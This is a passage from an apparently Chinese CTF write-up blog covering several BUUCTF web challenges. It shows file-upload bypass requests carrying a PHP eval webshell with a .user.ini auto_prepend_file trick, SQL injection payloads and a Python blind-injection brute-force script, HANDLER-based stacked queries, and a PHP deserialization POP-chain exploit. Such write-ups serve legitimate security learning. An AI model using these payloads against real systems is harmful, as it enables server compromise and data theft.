class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj--</span></span><br></code></pre></td></tr></table></figure><p>提示：<br>exif_imagetype:not image!</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>403<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary8mJUC80q1aGOXScd<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php2.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">FFD8FF</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd--</span></span><br></code></pre></td></tr></table></figure><p>提示：<br>exif_imagetype:not image!</p><p>这次换个文件头：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>403<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary3I0b63Tc4FZzgA5s<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php2.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">GIF89a</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s--</span></span><br></code></pre></td></tr></table></figure><p>回显  </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Your dir uploads/<span class="hljs-number">9987</span>df285bb375eda68448315c5656e5<br>Your files :<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">4</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;php2.jpg&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>那目录就是<br>&#x2F;uploads&#x2F;9987df285bb375eda68448315c5656e5&#x2F;php2.jpg<br>蚂蚁又是连不上，但是这次是nginx服务器啊，<br>那可能就是user.ini文件了<br>提交：  </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">GIF89a<br>auto_prepend_file <span class="hljs-operator">=</span> php2.jpg<br></code></pre></td></tr></table></figure><p>回显：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Your dir uploads/<span class="hljs-number">9987</span>df285bb375eda68448315c5656e5<br>Your files :<br><span class="hljs-function"><span class="hljs-title">array</span><span class="hljs-params">(<span class="hljs-number">5</span>)</span></span> &#123; <span class="hljs-selector-attr">[0]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-selector-attr">[1]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-selector-attr">[2]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;.user.ini&quot;</span> <span class="hljs-selector-attr">[3]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-selector-attr">[4]</span>=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;php2.jpg&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>这个.user.ini的大概用法是让目录下所有php文件包含上你指定的文件，看回显我上传的目录上是有一个index.php的，所以能用.user.ini的办法<br>蚂蚁连目录上的index.php即可<br>flag{e8b4a853-b79a-4497-912e-389a9fda03ba}</p><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>应该是sql题</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sml"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;or</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>);<br><br>回显：<br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;2&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;miaomiaomiao&quot;</span><br>&#125;<br><br><span class="hljs-built_in">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;114514&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;ys&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>怎么好像做过原题  </p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-meta">#</span><br>回显：<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">preg_match</span>(<span class="hljs-string">&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;</span>,$inject);<br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<span class="hljs-meta">#</span><br>ok<br>这样的话，感觉用sqlmap都行啊  <br>用了sqlmap默认，发现只能检索出数据库名<br>sumeqrq<span class="hljs-comment">@i</span><br><span class="hljs-comment">会不会是@</span>的问题？<br></code></pre></td></tr></table></figure><p>算了自己写个脚本吧</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>name=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># for d in range(0,100):</span><br><span class="hljs-comment">#     url = &quot;http://708bd9b9-1fc7-485b-8d30-cf4721d3516a.node5.buuoj.cn:81/?inject=1%27and+length%28database%28%29%29%3D&#123;&#125;%23#&quot;.format(d)</span><br><span class="hljs-comment">#     re = requests.get(url)</span><br><span class="hljs-comment">#     print(&quot;testing&quot;,d)</span><br><span class="hljs-comment">#     if &#x27;hahahah&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;数据库名长度为：&quot;,d)</span><br><span class="hljs-comment">#         break</span><br><span class="hljs-keyword">for</span> d1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):<br>    <span class="hljs-keyword">for</span> dn <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">137</span>):<br>        time.sleep(<span class="hljs-number">0.07</span>)<br>        url = <span class="hljs-string">&quot;http://708bd9b9-1fc7-485b-8d30-cf4721d3516a.node5.buuoj.cn:81/?inject=1%27and+ascii%28substr%28database%28%29%2C&#123;&#125;%2C1%29%29%3D&#123;&#125;%23#&quot;</span>.<span class="hljs-built_in">format</span>(d1,dn)<br>        re = requests.get(url)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;testing&quot;</span>,d1,<span class="hljs-built_in">chr</span>(dn),name)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hahahah&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            name=name+<span class="hljs-built_in">chr</span>(dn)<br>            <span class="hljs-built_in">print</span>(name)<br></code></pre></td></tr></table></figure><p>跑出来是 supersqli<br>但是无法用select和where，也许可以试试预编译？<br>1’;prepare hack from concat(‘sele’,’ct’,’*‘);execute hack;@<br>prepare也过滤了  </p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">and</span> <span class="hljs-title function_">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_">concat</span>(&#x27;<span class="hljs-operator">!</span>&#x27;,<span class="hljs-title function_">database</span>()))#<br><span class="hljs-comment">//error 1105 : XPATH syntax error: &#x27;!supersqli&#x27;</span><br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">and</span> <span class="hljs-title function_">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_">concat</span>(&#x27;<span class="hljs-operator">!</span>&#x27;,<span class="hljs-variable">show</span> <span class="hljs-variable">tables</span> <span class="hljs-variable">name</span>))#<br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">and</span> <span class="hljs-title function_">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_">concat</span>(&#x27;<span class="hljs-operator">!</span>&#x27;,@@<span class="hljs-variable">dir</span>))#<br><br><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">and</span> <span class="hljs-title function_">extractvalue</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_">concat</span>(&#x27;<span class="hljs-operator">!</span>&#x27;,<span class="hljs-title function_">user</span>()))#<br><span class="hljs-comment">//error 1105 : XPATH syntax error: &#x27;!root@localhost&#x27;</span><br><br>想用<span class="hljs-variable">rename</span>也被过滤了；<br><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">show</span> <span class="hljs-variable">databases</span>;#<br><br><span class="hljs-title function_">array</span>(2) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">11</span>) <span class="hljs-string">&quot;ctftraining&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">18</span>) <span class="hljs-string">&quot;information_schema&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;mysql&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">18</span>) <span class="hljs-string">&quot;performance_schema&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;supersqli&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;test&quot;</span><br>&#125;<br><br><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">show</span> <span class="hljs-variable">tables</span> <span class="hljs-variable">from</span> supersqli;#<br><br><span class="hljs-title function_">array</span>(2) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;FlagHere&quot;</span><br>&#125;<br><br><span class="hljs-title function_">array</span>(1) &#123;<br>  [<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><br>  <span class="hljs-title function_">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;words&quot;</span><br>&#125;<br><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">show</span> <span class="hljs-variable">colums</span> <span class="hljs-variable">from</span> <span class="hljs-title class_">FlagHere</span>;#<br>不回显<br><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">OPEN</span>;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">READ</span> <span class="hljs-variable">FIRST</span>;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">CLOSE</span>;<br>或者<br><span class="hljs-number">1</span>&#x27;;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">OPEN</span>;<span class="hljs-variable">HANDLER</span> <span class="hljs-title class_">FlagHere</span> <span class="hljs-variable">READ</span> <span class="hljs-variable">FIRST</span>;<br><span class="hljs-comment">//flag&#123;0bc2fe53-291d-4d3d-9a1c-adc6d658396e&#125;</span><br></code></pre></td></tr></table></figure><p>不说了，原题是2019网鼎杯 随便注，限制了重命名和预编译解法，但是能用handler，复制粘贴payload即可解。。。</p><h1 id="SWPUCTF-2021-新生赛-pop"><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1><p>以前的题，做了好久，看了一眼以前的wp，加上AreUSerialz，以后除了public类还是直接在原来的class里直接赋值的好，不然一直出问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;index.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;w44m&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;08067&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;w22m&#125;();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w22m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w33m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m-&gt;w00m=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w44m</span>();<br><span class="hljs-variable">$a</span>-&gt;w00m-&gt;w22m=<span class="hljs-string">&#x27;Getflag&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a 